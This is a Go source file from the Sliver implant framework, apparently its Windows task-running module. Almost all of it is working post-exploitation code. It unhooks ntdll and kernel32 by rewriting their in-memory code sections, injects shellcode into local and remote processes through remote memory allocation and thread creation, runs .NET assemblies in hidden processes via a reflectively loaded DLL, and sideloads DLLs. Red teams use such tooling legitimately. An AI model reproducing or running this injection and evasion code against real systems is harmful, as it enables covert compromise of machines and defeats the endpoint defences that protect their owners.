//+build windows

package taskrunner

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"debug/pe"
	"fmt"
	"io"
	"io/ioutil"

	// {{if .Debug}}
	"log"
	// {{else}}{{end}}
	"os/exec"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"github.com/bishopfox/sliver/sliver/version"
	"github.com/bishopfox/sliver/sliver/syscalls"
)

const (
	BobLoaderOffset     = 0x00000af0
	PROCESS_ALL_ACCESS  = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
	MAX_ASSEMBLY_LENGTH = 1025024
	STILL_ACTIVE        = 259
)

var (
	ntdllPath       = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
	kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
)

func sysAlloc(size int, rwxPages bool) (uintptr, error) {
	perms := windows.PAGE_EXECUTE_READWRITE
	if !rwxPages {
		perms = windows.PAGE_READWRITE
	}
	n := uintptr(size)
	addr, err := windows.VirtualAlloc(uintptr(0), n, windows.MEM_RESERVE|windows.MEM_COMMIT, uint32(perms))
	if addr == 0 {
		return 0, err
	}
	return addr, nil
}

func ptr(val interface{}) uintptr {
	switch val.(type) {
	case string:
		return uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(val.(string))))
	case int:
		return uintptr(val.(int))
	default:
		return uintptr(0)
	}
}

func RefreshPE(name string) error {
	//{{if .Debug}}
	log.Printf("Reloading %s...\n", name)
	//{{end}}
	df, e := ioutil.ReadFile(name)
	if e != nil {
		return e
	}
	f, e := pe.Open(name)
	if e != nil {
		return e
	}

	x := f.Section(".text")
	ddf := df[x.Offset:x.Size]
	return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
}

func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) error {
	t, e := windows.LoadDLL(pn)
	if e != nil {
		return e
	}
	h := t.Handle
	dllBase := uintptr(h)

	dllOffset := uint(dllBase) + uint(virtualoffset)

	var old int
	kernel32 := windows.NewLazyDLL("kernel32.dll")

	virtprot := kernel32.NewProc("VirtualProtect")
	r, _, e := virtprot.Call(
		uintptr(dllOffset),
		uintptr(len(b)),
		uintptr(0x40),
		uintptr(unsafe.Pointer(&old)),
	)
	if int(r) == 0 {
		return e
	}
	//{{if .Debug}}
	log.Println("Made memory map RWX")
	//{{end}}

	for i := 0; i < len(b); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = b[i]
	}

	//{{if .Debug}}
	log.Println("DLL overwritten")
	//{{end}}

	r, _, e = virtprot.Call(
		uintptr(dllOffset),
		uintptr(len(b)),
		uintptr(old),
		uintptr(unsafe.Pointer(&old)),
	)
	if int(r) == 0 {
		return e
	}
	//{{if .Debug}}
	log.Println("Restored memory map permissions")
	//{{end}}
	return nil
}

// injectTask - Injects shellcode into a process handle
func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) error {
	var (
		err        error
		remoteAddr uintptr
	)
	dataSize := len(data)
	// Remotely allocate memory in the target process
	// {{if .Debug}}
	log.Println("allocating remote process memory ...")
	// {{end}}
	if rwxPages {
		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	} else {
		remoteAddr, err = syscalls.VirtualAllocEx(processHandle, uintptr(0), uintptr(uint32(dataSize)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	}
	// {{if .Debug}}
	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
	// {{end}}
	if err != nil {
		// {{if .Debug}}
		log.Println("[!] failed to allocate remote process memory")
		// {{end}}
		return err
	}

	// Write the shellcode into the remotely allocated buffer
	var nLength uintptr
	err = syscalls.WriteProcessMemory(processHandle, remoteAddr, &data[0], uintptr(uint32(dataSize)), &nLength)
	// {{if .Debug}}
	log.Printf("writeprocessmemory returned: err = %v", err)
	// {{end}}
	if err != nil {
		// {{if .Debug}}
		log.Printf("[!] failed to write data into remote process")
		// {{end}}
		return err
	}
	if !rwxPages {
		var oldProtect uint32
		// Set proper page permissions
		err = syscalls.VirtualProtectEx(processHandle, remoteAddr, uintptr(uint(dataSize)), windows.PAGE_EXECUTE_READ, &oldProtect)
		if err != nil {
			//{{if .Debug}}
			log.Println("VirtualProtectEx failed:", err)
			//{{end}}
			return err
		}
	}
	// Create the remote thread to where we wrote the shellcode
	// {{if .Debug}}
	log.Println("successfully injected data, starting remote thread ....")
	// {{end}}
	attr := new(windows.SecurityAttributes)
	var lpThreadId uint32
	_, err = syscalls.CreateRemoteThread(processHandle, attr, uint32(0), remoteAddr, 0, 0, &lpThreadId)
	// {{if .Debug}}
	log.Printf("createremotethread returned:  err = %v", err)
	// {{end}}
	if err != nil {
		// {{if .Debug}}
		log.Printf("[!] failed to create remote thread")
		// {{end}}
		return err
	}
	return nil
}

// RermoteTask - Injects Task into a processID using remote threads
func RemoteTask(processID int, data []byte, rwxPages bool) error {
	var err error
	// Hotfix for #114
	// Somehow this fucks up everything on Windows 8.1
	// so we're skipping the RefreshPE calls.
	if version.GetVersion() != "6.3 build 9600" {
		err = RefreshPE(ntdllPath)
		if err != nil {
			//{{if .Debug}}
			log.Printf("RefreshPE on ntdll failed: %v\n", err)
			//{{end}}
			return err
		}
		err = RefreshPE(kernel32dllPath)
		if err != nil {
			//{{if .Debug}}
			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
			//{{end}}
			return err
		}
	}
	processHandle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
	if processHandle == 0 {
		return err
	}
	err = injectTask(processHandle, data, rwxPages)
	if err != nil {
		return err
	}
	return nil
}

func LocalTask(data []byte, rwxPages bool) error {
	var err error
	// Hotfix for #114
	// Somehow this fucks up everything on Windows 8.1
	// so we're skipping the RefreshPE calls.
	if version.GetVersion() != "6.3 build 9600" {
		err = RefreshPE(ntdllPath)
		if err != nil {
			//{{if .Debug}}
			log.Printf("RefreshPE on ntdll failed: %v\n", err)
			//{{end}}
			return err
		}
		err = RefreshPE(kernel32dllPath)
		if err != nil {
			//{{if .Debug}}
			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
			//{{end}}
			return err
		}
	}
	size := len(data)
	addr, _ := sysAlloc(size, rwxPages)
	buf := (*[9999999]byte)(unsafe.Pointer(addr))
	for index := 0; index < size; index++ {
		buf[index] = data[index]
	}
	if !rwxPages {
		var oldProtect uint32
		err = windows.VirtualProtect(addr, uintptr(size), windows.PAGE_EXECUTE_READ, &oldProtect)
		if err != nil {
			//{{if .Debug}}
			log.Println("VirtualProtect failed:", err)
			//{{end}}
			return err
		}
	}
	// {{if .Debug}}
	log.Printf("creating local thread with start address: 0x%08x", addr)
	// {{end}}
	var lpThreadId uint32
	_, err = syscalls.CreateThread(nil, 0, addr, uintptr(0), 0, &lpThreadId)
	return err
}

func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeout int32) (string, error) {
	err := RefreshPE(ntdllPath)
	if err != nil {
		return "", err
	}
	err = RefreshPE(kernel32dllPath)
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Println("[*] Assembly size:", len(assembly))
	log.Println("[*] Hosting dll size:", len(hostingDll))
	// {{end}}
	if len(assembly) > MAX_ASSEMBLY_LENGTH {
		return "", fmt.Errorf("please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH)
	}
	cmd := exec.Command(process)
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow: true,
	}
	var stdoutBuf, stderrBuf bytes.Buffer
	stdoutIn, _ := cmd.StdoutPipe()
	stderrIn, _ := cmd.StderrPipe()

	var errStdout, errStderr error
	err = cmd.Start()
	if err != nil {
		//{{if .Debug}}
		log.Println("Could not start process:", process)
		//{{end}}
		return "", err
	}
	pid := cmd.Process.Pid
	// {{if .Debug}}
	log.Printf("[*] %s started, pid = %d\n", process, pid)
	// {{end}}
	// OpenProcess with PROC_ACCESS_ALL
	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return "", err
	}
	// VirtualAllocEx to allocate a new memory segment into the target process
	hostingDllAddr, err := syscalls.VirtualAllocEx(handle, uintptr(0), uintptr(uint32(len(hostingDll))), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return "", err
	}
	// WriteProcessMemory to write the reflective loader into the process
	var nLength uintptr
	err = syscalls.WriteProcessMemory(handle, hostingDllAddr, &hostingDll[0], uintptr(uint32(len(hostingDll))), &nLength)
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
	// {{end}}
	// Total size to allocate = assembly size + 1024 bytes for the args
	totalSize := uint32(MAX_ASSEMBLY_LENGTH)
	// VirtualAllocEx to allocate another memory segment for hosting the .NET assembly and args
	assemblyAddr, err := syscalls.VirtualAllocEx(handle, uintptr(0), uintptr(totalSize), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return "", err
	}
	// Padd arguments with 0x00 -- there must be a cleaner way to do that
	paramsBytes := []byte(params)
	padding := make([]byte, 1024-len(params))
	final := append(paramsBytes, padding...)
	// Final payload: params + assembly
	final = append(final, assembly...)
	// WriteProcessMemory to write the .NET assembly + args
	err = syscalls.WriteProcessMemory(handle, assemblyAddr, &final[0], uintptr(uint32(len(final))), &nLength)
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
	// {{end}}
	// Apply R-X perms
	var oldProtect uint32
	err = syscalls.VirtualProtectEx(handle, hostingDllAddr, uintptr(uint(len(hostingDll))), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		//{{if .Debug}}
		log.Println("VirtualProtectEx failed:", err)
		//{{end}}
		return "", err
	}
	// CreateRemoteThread(DLL addr + offset, assembly addr)
	attr := new(windows.SecurityAttributes)
	var lpThreadId uint32
	threadHandle, err := syscalls.CreateRemoteThread(handle, attr, 0, uintptr(hostingDllAddr+BobLoaderOffset), uintptr(assemblyAddr), 0, &lpThreadId)
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
	// {{end}}
	for {
		var code uint32
		err = syscalls.GetExitCodeThread(threadHandle, &code)
		// log.Println(code)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			// {{if .Debug}}
			log.Printf("[-] Error when waiting for remote thread to exit: %s\n", err.Error())
			// {{end}}
			return "", err
		}
		if code == STILL_ACTIVE {
			time.Sleep(time.Second)
		} else {
			break
		}
	}
	cmd.Process.Kill()
	go func() {
		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
	}()
	_, errStderr = io.Copy(&stderrBuf, stderrIn)

	if errStdout != nil {
		return "", errStdout
	}
	if errStderr != nil {
		return "", errStderr
	}
	outStr, _ := string(stdoutBuf.Bytes()), string(stderrBuf.Bytes())
	// {{if .Debug}}
	log.Println("[*] Output:")
	log.Println(outStr)
	// {{end}}
	return outStr, nil
}

func SpawnDll(procName string, data []byte, offset uint32, args string) (string, error) {
	var err error
	// Hotfix for #114
	// Somehow this fucks up everything on Windows 8.1
	// so we're skipping the RefreshPE calls.
	if version.GetVersion() != "6.3 build 9600" {
		err = RefreshPE(ntdllPath)
		if err != nil {
			//{{if .Debug}}
			log.Printf("RefreshPE on ntdll failed: %v\n", err)
			//{{end}}
			return "", err
		}
		err = RefreshPE(kernel32dllPath)
		if err != nil {
			//{{if .Debug}}
			log.Printf("RefreshPE on kernel32 failed: %v\n", err)
			//{{end}}
			return "", err
		}
	}
	var stdoutBuff bytes.Buffer
	var stderrBuff bytes.Buffer
	// 1 - Start process
	cmd := exec.Command(procName)
	cmd.Stdout = &stdoutBuff
	cmd.Stderr = &stderrBuff
	cmd.SysProcAttr = &windows.SysProcAttr{
		//{{if .Debug}}
		HideWindow: false,
		//{{else}}
		HideWindow: true,
		//{{end}}
	}
	err = cmd.Start()
	if err != nil {
		//{{if .Debug}}
		log.Println("Could not start process:", procName)
		//{{end}}
		return "", err
	}
	pid := cmd.Process.Pid
	// 2 - Inject shellcode
	// {{if .Debug}}
	log.Printf("[*] %s started, pid = %d\n", procName, pid)
	// {{end}}
	// OpenProcess with PROC_ACCESS_ALL
	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, true, uint32(pid))
	if err != nil {
		return "", err
	}
	// VirtualAllocEx to allocate a new memory segment into the target process
	dataAddr, err := syscalls.VirtualAllocEx(handle, uintptr(0), uintptr(uint32(len(data))), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return "", err
	}
	// WriteProcessMemory to write the reflective loader into the process
	var nLength uintptr
	err = syscalls.WriteProcessMemory(handle, dataAddr, &data[0], uintptr(uint32(len(data))), &nLength)
	if err != nil {
		return "", err
	}
	argAddr := uintptr(0)
	if len(args) > 0 {
		// VirtualAllocEx to allocate a new memory segment into the target process
		argAddr, err = syscalls.VirtualAllocEx(handle, uintptr(0), uintptr(uint32(len(args))), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if err != nil {
			return "", err
		}
		// WriteProcessMemory to write the reflective loader into the process
		err = syscalls.WriteProcessMemory(handle, argAddr, &[]byte(args)[0], uintptr(uint32(len(args))), &nLength)
		if err != nil {
			return "", err
		}

	}
	//{{if .Debug}}
	log.Printf("[*] Args addr: 0x%08x\n", argAddr)
	//{{end}}
	// Apply R-X perms
	var oldProtect uint32
	err = syscalls.VirtualProtectEx(handle, dataAddr, uintptr(uint(len(data))), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		//{{if .Debug}}
		log.Println("VirtualProtectEx failed:", err)
		//{{end}}
		return "", err
	}
	// 3 - Create thread
	attr := new(windows.SecurityAttributes)
	var lpThreadId uint32
	threadHandle, err := syscalls.CreateRemoteThread(handle, attr, 0, uintptr(dataAddr)+uintptr(offset), uintptr(argAddr), 0, &lpThreadId)
	if err != nil {
		return "", err
	}
	// {{if .Debug}}
	log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
	// {{end}}

	// 4 - Wait for thread to finish
	for {
		var code uint32
		err = syscalls.GetExitCodeThread(threadHandle, &code)
		// log.Println(code)
		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
			// {{if .Debug}}
			log.Printf("[-] Error when waiting for remote thread to exit: %s\n", err.Error())
			// {{end}}
			return "", err
		}
		if code == STILL_ACTIVE {
			time.Sleep(time.Second)
		} else {
			break
		}
	}
	cmd.Process.Kill()
	return stdoutBuff.String() + stderrBuff.String(), nil
}

//SideLoad - Side load a binary as shellcode and returns its output
func Sideload(procName string, data []byte) (string, error) {
	return SpawnDll(procName, data, 0, "")
}
